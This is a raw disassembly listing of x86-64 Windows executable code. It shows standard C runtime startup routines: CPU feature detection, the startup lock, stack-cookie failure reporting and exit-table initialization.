   140003ae1:	8b c8                	mov    %eax,%ecx
   140003ae3:	e8 f0 45 00 00       	call   0x1400080d8
   140003ae8:	e8 77 09 00 00       	call   0x140004464
   140003aed:	8b d8                	mov    %eax,%ebx
   140003aef:	e8 78 47 00 00       	call   0x14000826c
   140003af4:	b9 01 00 00 00       	mov    $0x1,%ecx
   140003af9:	89 18                	mov    %ebx,(%rax)
   140003afb:	e8 ec 06 00 00       	call   0x1400041ec
   140003b00:	84 c0                	test   %al,%al
   140003b02:	74 73                	je     0x140003b77
   140003b04:	e8 33 0c 00 00       	call   0x14000473c
   140003b09:	48 8d 0d 68 0c 00 00 	lea    0xc68(%rip),%rcx        # 0x140004778
   140003b10:	e8 87 08 00 00       	call   0x14000439c
   140003b15:	e8 4e 09 00 00       	call   0x140004468
   140003b1a:	8b c8                	mov    %eax,%ecx
   140003b1c:	e8 13 3e 00 00       	call   0x140007934
   140003b21:	85 c0                	test   %eax,%eax
   140003b23:	75 52                	jne    0x140003b77
   140003b25:	e8 4e 09 00 00       	call   0x140004478
   140003b2a:	e8 8d 09 00 00       	call   0x1400044bc
   140003b2f:	85 c0                	test   %eax,%eax
   140003b31:	74 0c                	je     0x140003b3f
   140003b33:	48 8d 0d 2a 09 00 00 	lea    0x92a(%rip),%rcx        # 0x140004464
   140003b3a:	e8 b1 3b 00 00       	call   0x1400076f0
   140003b3f:	e8 48 09 00 00       	call   0x14000448c
   140003b44:	e8 43 09 00 00       	call   0x14000448c
   140003b49:	e8 16 09 00 00       	call   0x140004464
   140003b4e:	8b c8                	mov    %eax,%ecx
   140003b50:	e8 6f 46 00 00       	call   0x1400081c4
   140003b55:	e8 2e 09 00 00       	call   0x140004488
   140003b5a:	84 c0                	test   %al,%al
   140003b5c:	74 05                	je     0x140003b63
   140003b5e:	e8 99 41 00 00       	call   0x140007cfc
   140003b63:	e8 fc 08 00 00       	call   0x140004464
   140003b68:	e8 ff 0a 00 00       	call   0x14000466c
   140003b6d:	85 c0                	test   %eax,%eax
   140003b6f:	75 06                	jne    0x140003b77
   140003b71:	48 83 c4 20          	add    $0x20,%rsp
   140003b75:	5b                   	pop    %rbx
   140003b76:	c3                   	ret
   140003b77:	b9 07 00 00 00       	mov    $0x7,%ecx
   140003b7c:	e8 63 09 00 00       	call   0x1400044e4
   140003b81:	cc                   	int3
   140003b82:	cc                   	int3
   140003b83:	cc                   	int3
   140003b84:	48 83 ec 28          	sub    $0x28,%rsp
   140003b88:	e8 13 09 00 00       	call   0x1400044a0
   140003b8d:	33 c0                	xor    %eax,%eax
   140003b8f:	48 83 c4 28          	add    $0x28,%rsp
   140003b93:	c3                   	ret
   140003b94:	48 83 ec 28          	sub    $0x28,%rsp
   140003b98:	e8 2b 0b 00 00       	call   0x1400046c8
   140003b9d:	e8 c2 08 00 00       	call   0x140004464
   140003ba2:	8b c8                	mov    %eax,%ecx
   140003ba4:	48 83 c4 28          	add    $0x28,%rsp
   140003ba8:	e9 93 46 00 00       	jmp    0x140008240
   140003bad:	cc                   	int3
   140003bae:	cc                   	int3
   140003baf:	cc                   	int3
   140003bb0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003bb5:	57                   	push   %rdi
   140003bb6:	48 83 ec 30          	sub    $0x30,%rsp
   140003bba:	b9 01 00 00 00       	mov    $0x1,%ecx
   140003bbf:	e8 ec 05 00 00       	call   0x1400041b0
   140003bc4:	84 c0                	test   %al,%al
   140003bc6:	0f 84 30 01 00 00    	je     0x140003cfc
   140003bcc:	40 32 ff             	xor    %dil,%dil
   140003bcf:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140003bd4:	e8 9b 05 00 00       	call   0x140004174
   140003bd9:	8a d8                	mov    %al,%bl
   140003bdb:	8b 0d ff b4 01 00    	mov    0x1b4ff(%rip),%ecx        # 0x14001f0e0
   140003be1:	83 f9 01             	cmp    $0x1,%ecx
   140003be4:	0f 84 1d 01 00 00    	je     0x140003d07
   140003bea:	85 c9                	test   %ecx,%ecx
   140003bec:	75 4a                	jne    0x140003c38
   140003bee:	c7 05 e8 b4 01 00 01 	movl   $0x1,0x1b4e8(%rip)        # 0x14001f0e0
   140003bf5:	00 00 00 
   140003bf8:	48 8d 15 51 d7 00 00 	lea    0xd751(%rip),%rdx        # 0x140011350
   140003bff:	48 8d 0d 12 d7 00 00 	lea    0xd712(%rip),%rcx        # 0x140011318
   140003c06:	e8 a5 41 00 00       	call   0x140007db0
   140003c0b:	85 c0                	test   %eax,%eax
   140003c0d:	74 0a                	je     0x140003c19
   140003c0f:	b8 ff 00 00 00       	mov    $0xff,%eax
   140003c14:	e9 d8 00 00 00       	jmp    0x140003cf1
   140003c19:	48 8d 15 f0 d6 00 00 	lea    0xd6f0(%rip),%rdx        # 0x140011310
   140003c20:	48 8d 0d d9 d6 00 00 	lea    0xd6d9(%rip),%rcx        # 0x140011300
   140003c27:	e8 4c 41 00 00       	call   0x140007d78
   140003c2c:	c7 05 aa b4 01 00 02 	movl   $0x2,0x1b4aa(%rip)        # 0x14001f0e0
   140003c33:	00 00 00 
   140003c36:	eb 08                	jmp    0x140003c40
   140003c38:	40 b7 01             	mov    $0x1,%dil
   140003c3b:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140003c40:	8a cb                	mov    %bl,%cl
   140003c42:	e8 c9 06 00 00       	call   0x140004310
   140003c47:	e8 7c 08 00 00       	call   0x1400044c8
   140003c4c:	48 8b d8             	mov    %rax,%rbx
   140003c4f:	48 83 38 00          	cmpq   $0x0,(%rax)
   140003c53:	74 1e                	je     0x140003c73
   140003c55:	48 8b c8             	mov    %rax,%rcx
   140003c58:	e8 1b 06 00 00       	call   0x140004278
   140003c5d:	84 c0                	test   %al,%al
   140003c5f:	74 12                	je     0x140003c73
   140003c61:	45 33 c0             	xor    %r8d,%r8d
   140003c64:	41 8d 50 02          	lea    0x2(%r8),%edx
   140003c68:	33 c9                	xor    %ecx,%ecx
   140003c6a:	48 8b 03             	mov    (%rbx),%rax
   140003c6d:	ff 15 65 d6 00 00    	call   *0xd665(%rip)        # 0x1400112d8
   140003c73:	e8 58 08 00 00       	call   0x1400044d0
   140003c78:	48 8b d8             	mov    %rax,%rbx
   140003c7b:	48 83 38 00          	cmpq   $0x0,(%rax)
   140003c7f:	74 14                	je     0x140003c95
   140003c81:	48 8b c8             	mov    %rax,%rcx
   140003c84:	e8 ef 05 00 00       	call   0x140004278
   140003c89:	84 c0                	test   %al,%al
   140003c8b:	74 08                	je     0x140003c95
   140003c8d:	48 8b 0b             	mov    (%rbx),%rcx
   140003c90:	e8 fb 43 00 00       	call   0x140008090
   140003c95:	e8 96 09 00 00       	call   0x140004630
   140003c9a:	0f b7 d8             	movzwl %ax,%ebx
   140003c9d:	e8 62 40 00 00       	call   0x140007d04
   140003ca2:	44 8b cb             	mov    %ebx,%r9d
   140003ca5:	4c 8b c0             	mov    %rax,%r8
   140003ca8:	33 d2                	xor    %edx,%edx
   140003caa:	48 8d 0d 4f c3 ff ff 	lea    -0x3cb1(%rip),%rcx        # 0x140000000
   140003cb1:	e8 5a df ff ff       	call   0x140001c10
   140003cb6:	8b d8                	mov    %eax,%ebx
   140003cb8:	e8 b7 09 00 00       	call   0x140004674
   140003cbd:	84 c0                	test   %al,%al
   140003cbf:	74 50                	je     0x140003d11
   140003cc1:	40 84 ff             	test   %dil,%dil
   140003cc4:	75 05                	jne    0x140003ccb
   140003cc6:	e8 a9 43 00 00       	call   0x140008074
   140003ccb:	33 d2                	xor    %edx,%edx
   140003ccd:	b1 01                	mov    $0x1,%cl
   140003ccf:	e8 60 06 00 00       	call   0x140004334
   140003cd4:	8b c3                	mov    %ebx,%eax
   140003cd6:	eb 19                	jmp    0x140003cf1
   140003cd8:	8b d8                	mov    %eax,%ebx
   140003cda:	e8 95 09 00 00       	call   0x140004674
   140003cdf:	84 c0                	test   %al,%al
   140003ce1:	74 36                	je     0x140003d19
   140003ce3:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   140003ce8:	75 05                	jne    0x140003cef
   140003cea:	e8 75 43 00 00       	call   0x140008064
   140003cef:	8b c3                	mov    %ebx,%eax
   140003cf1:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003cf6:	48 83 c4 30          	add    $0x30,%rsp
   140003cfa:	5f                   	pop    %rdi
   140003cfb:	c3                   	ret
   140003cfc:	b9 07 00 00 00       	mov    $0x7,%ecx
   140003d01:	e8 de 07 00 00       	call   0x1400044e4
   140003d06:	90                   	nop
   140003d07:	b9 07 00 00 00       	mov    $0x7,%ecx
   140003d0c:	e8 d3 07 00 00       	call   0x1400044e4
   140003d11:	8b cb                	mov    %ebx,%ecx
   140003d13:	e8 b4 43 00 00       	call   0x1400080cc
   140003d18:	90                   	nop
   140003d19:	8b cb                	mov    %ebx,%ecx
   140003d1b:	e8 64 43 00 00       	call   0x140008084
   140003d20:	90                   	nop
   140003d21:	cc                   	int3
   140003d22:	cc                   	int3
   140003d23:	cc                   	int3
   140003d24:	48 83 ec 28          	sub    $0x28,%rsp
   140003d28:	e8 87 06 00 00       	call   0x1400043b4
   140003d2d:	48 83 c4 28          	add    $0x28,%rsp
   140003d31:	e9 7a fe ff ff       	jmp    0x140003bb0
   140003d36:	cc                   	int3
   140003d37:	cc                   	int3
   140003d38:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003d3d:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140003d42:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003d47:	57                   	push   %rdi
   140003d48:	48 83 ec 10          	sub    $0x10,%rsp
   140003d4c:	33 c0                	xor    %eax,%eax
   140003d4e:	33 c9                	xor    %ecx,%ecx
   140003d50:	0f a2                	cpuid
   140003d52:	81 f1 6e 74 65 6c    	xor    $0x6c65746e,%ecx
   140003d58:	81 f2 69 6e 65 49    	xor    $0x49656e69,%edx
   140003d5e:	0b d1                	or     %ecx,%edx
   140003d60:	8b e8                	mov    %eax,%ebp
   140003d62:	b8 01 00 00 00       	mov    $0x1,%eax
   140003d67:	81 f3 47 65 6e 75    	xor    $0x756e6547,%ebx
   140003d6d:	0b d3                	or     %ebx,%edx
   140003d6f:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140003d72:	0f a2                	cpuid
   140003d74:	8b f9                	mov    %ecx,%edi
   140003d76:	75 5e                	jne    0x140003dd6
   140003d78:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   140003d7d:	48 c7 05 d0 a2 01 00 	movq   $0x8000,0x1a2d0(%rip)        # 0x14001e058
   140003d84:	00 80 00 00 
   140003d88:	48 c7 05 cd a2 01 00 	movq   $0xffffffffffffffff,0x1a2cd(%rip)        # 0x14001e060
   140003d8f:	ff ff ff ff 
   140003d93:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   140003d98:	74 28                	je     0x140003dc2
   140003d9a:	3d 60 06 02 00       	cmp    $0x20660,%eax
   140003d9f:	74 21                	je     0x140003dc2
   140003da1:	3d 70 06 02 00       	cmp    $0x20670,%eax
   140003da6:	74 1a                	je     0x140003dc2
   140003da8:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   140003dad:	83 f8 20             	cmp    $0x20,%eax
   140003db0:	77 24                	ja     0x140003dd6
   140003db2:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   140003db9:	00 00 00 
   140003dbc:	48 0f a3 c1          	bt     %rax,%rcx
   140003dc0:	73 14                	jae    0x140003dd6
   140003dc2:	44 8b 05 9f ad 01 00 	mov    0x1ad9f(%rip),%r8d        # 0x14001eb68
   140003dc9:	41 83 c8 01          	or     $0x1,%r8d
   140003dcd:	44 89 05 94 ad 01 00 	mov    %r8d,0x1ad94(%rip)        # 0x14001eb68
   140003dd4:	eb 07                	jmp    0x140003ddd
   140003dd6:	44 8b 05 8b ad 01 00 	mov    0x1ad8b(%rip),%r8d        # 0x14001eb68
   140003ddd:	45 33 c9             	xor    %r9d,%r9d
   140003de0:	41 8b f1             	mov    %r9d,%esi
   140003de3:	45 8b d1             	mov    %r9d,%r10d
   140003de6:	45 8b d9             	mov    %r9d,%r11d
   140003de9:	83 fd 07             	cmp    $0x7,%ebp
   140003dec:	7c 40                	jl     0x140003e2e
   140003dee:	41 8d 41 07          	lea    0x7(%r9),%eax
   140003df2:	33 c9                	xor    %ecx,%ecx
   140003df4:	0f a2                	cpuid
   140003df6:	8b f2                	mov    %edx,%esi
   140003df8:	44 8b cb             	mov    %ebx,%r9d
   140003dfb:	0f ba e3 09          	bt     $0x9,%ebx
   140003dff:	73 0b                	jae    0x140003e0c
   140003e01:	41 83 c8 02          	or     $0x2,%r8d
   140003e05:	44 89 05 5c ad 01 00 	mov    %r8d,0x1ad5c(%rip)        # 0x14001eb68
   140003e0c:	83 f8 01             	cmp    $0x1,%eax
   140003e0f:	7c 0d                	jl     0x140003e1e
   140003e11:	b8 07 00 00 00       	mov    $0x7,%eax
   140003e16:	8d 48 fa             	lea    -0x6(%rax),%ecx
   140003e19:	0f a2                	cpuid
   140003e1b:	44 8b d2             	mov    %edx,%r10d
   140003e1e:	b8 24 00 00 00       	mov    $0x24,%eax
   140003e23:	3b e8                	cmp    %eax,%ebp
   140003e25:	7c 07                	jl     0x140003e2e
   140003e27:	33 c9                	xor    %ecx,%ecx
   140003e29:	0f a2                	cpuid
   140003e2b:	44 8b db             	mov    %ebx,%r11d
   140003e2e:	48 8b 05 13 a2 01 00 	mov    0x1a213(%rip),%rax        # 0x14001e048
   140003e35:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   140003e39:	c7 05 0d a2 01 00 01 	movl   $0x1,0x1a20d(%rip)        # 0x14001e050
   140003e40:	00 00 00 
   140003e43:	c7 05 07 a2 01 00 02 	movl   $0x2,0x1a207(%rip)        # 0x14001e054
   140003e4a:	00 00 00 
   140003e4d:	48 89 05 f4 a1 01 00 	mov    %rax,0x1a1f4(%rip)        # 0x14001e048
   140003e54:	0f ba e7 14          	bt     $0x14,%edi
   140003e58:	73 1f                	jae    0x140003e79
   140003e5a:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   140003e5e:	c7 05 e8 a1 01 00 02 	movl   $0x2,0x1a1e8(%rip)        # 0x14001e050
   140003e65:	00 00 00 
   140003e68:	48 89 05 d9 a1 01 00 	mov    %rax,0x1a1d9(%rip)        # 0x14001e048
   140003e6f:	c7 05 db a1 01 00 06 	movl   $0x6,0x1a1db(%rip)        # 0x14001e054
   140003e76:	00 00 00 
   140003e79:	0f ba e7 1b          	bt     $0x1b,%edi
   140003e7d:	0f 83 33 01 00 00    	jae    0x140003fb6
   140003e83:	33 c9                	xor    %ecx,%ecx
   140003e85:	0f 01 d0             	xgetbv
   140003e88:	48 c1 e2 20          	shl    $0x20,%rdx
   140003e8c:	48 0b d0             	or     %rax,%rdx
   140003e8f:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140003e94:	0f ba e7 1c          	bt     $0x1c,%edi
   140003e98:	0f 83 fc 00 00 00    	jae    0x140003f9a
   140003e9e:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140003ea3:	24 06                	and    $0x6,%al
   140003ea5:	3c 06                	cmp    $0x6,%al
   140003ea7:	0f 85 ed 00 00 00    	jne    0x140003f9a
   140003ead:	8b 05 a1 a1 01 00    	mov    0x1a1a1(%rip),%eax        # 0x14001e054
   140003eb3:	b2 e0                	mov    $0xe0,%dl
   140003eb5:	83 c8 08             	or     $0x8,%eax
   140003eb8:	c7 05 8e a1 01 00 03 	movl   $0x3,0x1a18e(%rip)        # 0x14001e050
   140003ebf:	00 00 00 
   140003ec2:	89 05 8c a1 01 00    	mov    %eax,0x1a18c(%rip)        # 0x14001e054
   140003ec8:	41 f6 c1 20          	test   $0x20,%r9b
   140003ecc:	74 62                	je     0x140003f30
   140003ece:	83 c8 20             	or     $0x20,%eax
   140003ed1:	c7 05 75 a1 01 00 05 	movl   $0x5,0x1a175(%rip)        # 0x14001e050
   140003ed8:	00 00 00 
   140003edb:	89 05 73 a1 01 00    	mov    %eax,0x1a173(%rip)        # 0x14001e054
   140003ee1:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   140003ee6:	48 8b 05 5b a1 01 00 	mov    0x1a15b(%rip),%rax        # 0x14001e048
   140003eed:	44 23 c9             	and    %ecx,%r9d
   140003ef0:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   140003ef4:	48 89 05 4d a1 01 00 	mov    %rax,0x1a14d(%rip)        # 0x14001e048
   140003efb:	44 3b c9             	cmp    %ecx,%r9d
   140003efe:	75 37                	jne    0x140003f37
   140003f00:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140003f05:	22 c2                	and    %dl,%al
   140003f07:	3a c2                	cmp    %dl,%al
   140003f09:	75 25                	jne    0x140003f30
   140003f0b:	48 8b 05 36 a1 01 00 	mov    0x1a136(%rip),%rax        # 0x14001e048
   140003f12:	83 0d 3b a1 01 00 40 	orl    $0x40,0x1a13b(%rip)        # 0x14001e054
   140003f19:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   140003f1d:	c7 05 29 a1 01 00 06 	movl   $0x6,0x1a129(%rip)        # 0x14001e050
   140003f24:	00 00 00 
   140003f27:	48 89 05 1a a1 01 00 	mov    %rax,0x1a11a(%rip)        # 0x14001e048
   140003f2e:	eb 07                	jmp    0x140003f37
   140003f30:	48 8b 05 11 a1 01 00 	mov    0x1a111(%rip),%rax        # 0x14001e048
   140003f37:	0f ba e6 17          	bt     $0x17,%esi
   140003f3b:	73 0c                	jae    0x140003f49
   140003f3d:	48 0f ba f0 18       	btr    $0x18,%rax
   140003f42:	48 89 05 ff a0 01 00 	mov    %rax,0x1a0ff(%rip)        # 0x14001e048
   140003f49:	41 0f ba e2 13       	bt     $0x13,%r10d
   140003f4e:	73 4a                	jae    0x140003f9a
   140003f50:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140003f55:	22 c2                	and    %dl,%al
   140003f57:	3a c2                	cmp    %dl,%al
   140003f59:	75 3f                	jne    0x140003f9a
   140003f5b:	41 8b cb             	mov    %r11d,%ecx
   140003f5e:	41 8b c3             	mov    %r11d,%eax
   140003f61:	48 c1 e9 10          	shr    $0x10,%rcx
   140003f65:	25 ff 00 04 00       	and    $0x400ff,%eax
   140003f6a:	83 e1 06             	and    $0x6,%ecx
   140003f6d:	89 05 f1 ab 01 00    	mov    %eax,0x1abf1(%rip)        # 0x14001eb64
   140003f73:	48 81 c9 29 00 00 01 	or     $0x1000029,%rcx
   140003f7a:	48 f7 d1             	not    %rcx
   140003f7d:	48 23 0d c4 a0 01 00 	and    0x1a0c4(%rip),%rcx        # 0x14001e048
   140003f84:	48 89 0d bd a0 01 00 	mov    %rcx,0x1a0bd(%rip)        # 0x14001e048
   140003f8b:	3c 01                	cmp    $0x1,%al
   140003f8d:	76 0b                	jbe    0x140003f9a
   140003f8f:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   140003f93:	48 89 0d ae a0 01 00 	mov    %rcx,0x1a0ae(%rip)        # 0x14001e048
   140003f9a:	41 0f ba e2 15       	bt     $0x15,%r10d
   140003f9f:	73 15                	jae    0x140003fb6
   140003fa1:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140003fa6:	48 0f ba e0 13       	bt     $0x13,%rax
   140003fab:	73 09                	jae    0x140003fb6
   140003fad:	48 0f ba 35 92 a0 01 	btrq   $0x7,0x1a092(%rip)        # 0x14001e048
   140003fb4:	00 07 
   140003fb6:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140003fbb:	33 c0                	xor    %eax,%eax
   140003fbd:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140003fc2:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140003fc7:	48 83 c4 10          	add    $0x10,%rsp
   140003fcb:	5f                   	pop    %rdi
   140003fcc:	c3                   	ret
   140003fcd:	cc                   	int3
   140003fce:	cc                   	int3
   140003fcf:	cc                   	int3
   140003fd0:	48 83 ec 48          	sub    $0x48,%rsp
   140003fd4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003fd9:	e8 a2 eb ff ff       	call   0x140002b80
   140003fde:	48 8d 15 83 8b 01 00 	lea    0x18b83(%rip),%rdx        # 0x14001cb68
   140003fe5:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003fea:	e8 79 08 00 00       	call   0x140004868
   140003fef:	cc                   	int3
   140003ff0:	e9 8b 42 00 00       	jmp    0x140008280
   140003ff5:	cc                   	int3
   140003ff6:	cc                   	int3
   140003ff7:	cc                   	int3
   140003ff8:	40 53                	rex push %rbx
   140003ffa:	48 83 ec 20          	sub    $0x20,%rsp
   140003ffe:	48 8b d9             	mov    %rcx,%rbx
   140004001:	33 c9                	xor    %ecx,%ecx
   140004003:	ff 15 bf d0 00 00    	call   *0xd0bf(%rip)        # 0x1400110c8
   140004009:	48 8b cb             	mov    %rbx,%rcx
   14000400c:	ff 15 ae d0 00 00    	call   *0xd0ae(%rip)        # 0x1400110c0
   140004012:	ff 15 b8 d0 00 00    	call   *0xd0b8(%rip)        # 0x1400110d0
   140004018:	48 8b c8             	mov    %rax,%rcx
   14000401b:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   140004020:	48 83 c4 20          	add    $0x20,%rsp
   140004024:	5b                   	pop    %rbx
   140004025:	48 ff 25 ac d0 00 00 	rex.W jmp *0xd0ac(%rip)        # 0x1400110d8
   14000402c:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140004031:	48 83 ec 38          	sub    $0x38,%rsp
   140004035:	b9 17 00 00 00       	mov    $0x17,%ecx
   14000403a:	ff 15 a0 d0 00 00    	call   *0xd0a0(%rip)        # 0x1400110e0
   140004040:	85 c0                	test   %eax,%eax
   140004042:	74 07                	je     0x14000404b
   140004044:	b9 02 00 00 00       	mov    $0x2,%ecx
   140004049:	cd 29                	int    $0x29
   14000404b:	48 8d 0d be ab 01 00 	lea    0x1abbe(%rip),%rcx        # 0x14001ec10
   140004052:	e8 a9 00 00 00       	call   0x140004100
   140004057:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   14000405c:	48 89 05 a5 ac 01 00 	mov    %rax,0x1aca5(%rip)        # 0x14001ed08
   140004063:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140004068:	48 83 c0 08          	add    $0x8,%rax
   14000406c:	48 89 05 35 ac 01 00 	mov    %rax,0x1ac35(%rip)        # 0x14001eca8
   140004073:	48 8b 05 8e ac 01 00 	mov    0x1ac8e(%rip),%rax        # 0x14001ed08
   14000407a:	48 89 05 ff aa 01 00 	mov    %rax,0x1aaff(%rip)        # 0x14001eb80
   140004081:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140004086:	48 89 05 03 ac 01 00 	mov    %rax,0x1ac03(%rip)        # 0x14001ec90
   14000408d:	c7 05 d9 aa 01 00 09 	movl   $0xc0000409,0x1aad9(%rip)        # 0x14001eb70
   140004094:	04 00 c0 
   140004097:	c7 05 d3 aa 01 00 01 	movl   $0x1,0x1aad3(%rip)        # 0x14001eb74
   14000409e:	00 00 00 
   1400040a1:	c7 05 dd aa 01 00 01 	movl   $0x1,0x1aadd(%rip)        # 0x14001eb88
   1400040a8:	00 00 00 
   1400040ab:	b8 08 00 00 00       	mov    $0x8,%eax
   1400040b0:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400040b4:	48 8d 0d d5 aa 01 00 	lea    0x1aad5(%rip),%rcx        # 0x14001eb90
   1400040bb:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   1400040c2:	00 
   1400040c3:	b8 08 00 00 00       	mov    $0x8,%eax
   1400040c8:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400040cc:	48 8b 0d 2d 9f 01 00 	mov    0x19f2d(%rip),%rcx        # 0x14001e000
   1400040d3:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1400040d8:	b8 08 00 00 00       	mov    $0x8,%eax
   1400040dd:	48 6b c0 01          	imul   $0x1,%rax,%rax
   1400040e1:	48 8b 0d 58 9f 01 00 	mov    0x19f58(%rip),%rcx        # 0x14001e040
   1400040e8:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1400040ed:	48 8d 0d 1c f9 00 00 	lea    0xf91c(%rip),%rcx        # 0x140013a10
   1400040f4:	e8 ff fe ff ff       	call   0x140003ff8
   1400040f9:	90                   	nop
   1400040fa:	48 83 c4 38          	add    $0x38,%rsp
   1400040fe:	c3                   	ret
   1400040ff:	cc                   	int3
   140004100:	40 53                	rex push %rbx
   140004102:	56                   	push   %rsi
   140004103:	57                   	push   %rdi
   140004104:	48 83 ec 40          	sub    $0x40,%rsp
   140004108:	48 8b d9             	mov    %rcx,%rbx
   14000410b:	ff 15 97 cf 00 00    	call   *0xcf97(%rip)        # 0x1400110a8
   140004111:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   140004118:	33 ff                	xor    %edi,%edi
   14000411a:	45 33 c0             	xor    %r8d,%r8d
   14000411d:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140004122:	48 8b ce             	mov    %rsi,%rcx
   140004125:	ff 15 85 cf 00 00    	call   *0xcf85(%rip)        # 0x1400110b0
   14000412b:	48 85 c0             	test   %rax,%rax
   14000412e:	74 3c                	je     0x14000416c
   140004130:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140004135:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   14000413a:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140004141:	00 00 
   140004143:	4c 8b c8             	mov    %rax,%r9
   140004146:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000414b:	4c 8b c6             	mov    %rsi,%r8
   14000414e:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004153:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004158:	33 c9                	xor    %ecx,%ecx
   14000415a:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000415f:	ff 15 53 cf 00 00    	call   *0xcf53(%rip)        # 0x1400110b8
   140004165:	ff c7                	inc    %edi
   140004167:	83 ff 02             	cmp    $0x2,%edi
   14000416a:	7c ae                	jl     0x14000411a
   14000416c:	48 83 c4 40          	add    $0x40,%rsp
   140004170:	5f                   	pop    %rdi
   140004171:	5e                   	pop    %rsi
   140004172:	5b                   	pop    %rbx
   140004173:	c3                   	ret
   140004174:	48 83 ec 28          	sub    $0x28,%rsp
   140004178:	e8 37 06 00 00       	call   0x1400047b4
   14000417d:	85 c0                	test   %eax,%eax
   14000417f:	74 21                	je     0x1400041a2
   140004181:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140004188:	00 00 
   14000418a:	48 8b 48 08          	mov    0x8(%rax),%rcx
   14000418e:	eb 05                	jmp    0x140004195
   140004190:	48 3b c8             	cmp    %rax,%rcx
   140004193:	74 14                	je     0x1400041a9
   140004195:	33 c0                	xor    %eax,%eax
   140004197:	f0 48 0f b1 0d 48 af 	lock cmpxchg %rcx,0x1af48(%rip)        # 0x14001f0e8
   14000419e:	01 00 
   1400041a0:	75 ee                	jne    0x140004190
   1400041a2:	32 c0                	xor    %al,%al
   1400041a4:	48 83 c4 28          	add    $0x28,%rsp
   1400041a8:	c3                   	ret
   1400041a9:	b0 01                	mov    $0x1,%al
   1400041ab:	eb f7                	jmp    0x1400041a4
   1400041ad:	cc                   	int3
   1400041ae:	cc                   	int3
   1400041af:	cc                   	int3
   1400041b0:	48 83 ec 28          	sub    $0x28,%rsp
   1400041b4:	85 c9                	test   %ecx,%ecx
   1400041b6:	75 07                	jne    0x1400041bf
   1400041b8:	c6 05 31 af 01 00 01 	movb   $0x1,0x1af31(%rip)        # 0x14001f0f0
   1400041bf:	e8 74 fb ff ff       	call   0x140003d38
   1400041c4:	e8 5f 09 00 00       	call   0x140004b28
   1400041c9:	84 c0                	test   %al,%al
   1400041cb:	75 04                	jne    0x1400041d1
   1400041cd:	32 c0                	xor    %al,%al
   1400041cf:	eb 14                	jmp    0x1400041e5
   1400041d1:	e8 e2 45 00 00       	call   0x1400087b8
   1400041d6:	84 c0                	test   %al,%al
   1400041d8:	75 09                	jne    0x1400041e3
   1400041da:	33 c9                	xor    %ecx,%ecx
   1400041dc:	e8 6f 09 00 00       	call   0x140004b50
   1400041e1:	eb ea                	jmp    0x1400041cd
   1400041e3:	b0 01                	mov    $0x1,%al
   1400041e5:	48 83 c4 28          	add    $0x28,%rsp
   1400041e9:	c3                   	ret
   1400041ea:	cc                   	int3
   1400041eb:	cc                   	int3
   1400041ec:	40 53                	rex push %rbx
   1400041ee:	48 83 ec 20          	sub    $0x20,%rsp
   1400041f2:	80 3d f8 ae 01 00 00 	cmpb   $0x0,0x1aef8(%rip)        # 0x14001f0f1
   1400041f9:	8b d9                	mov    %ecx,%ebx
   1400041fb:	75 67                	jne    0x140004264
   1400041fd:	83 f9 01             	cmp    $0x1,%ecx
   140004200:	77 6a                	ja     0x14000426c
   140004202:	e8 ad 05 00 00       	call   0x1400047b4
   140004207:	85 c0                	test   %eax,%eax
   140004209:	74 28                	je     0x140004233
   14000420b:	85 db                	test   %ebx,%ebx
   14000420d:	75 24                	jne    0x140004233
   14000420f:	48 8d 0d e2 ae 01 00 	lea    0x1aee2(%rip),%rcx        # 0x14001f0f8
   140004216:	e8 01 44 00 00       	call   0x14000861c
   14000421b:	85 c0                	test   %eax,%eax
   14000421d:	75 10                	jne    0x14000422f
   14000421f:	48 8d 0d ea ae 01 00 	lea    0x1aeea(%rip),%rcx        # 0x14001f110
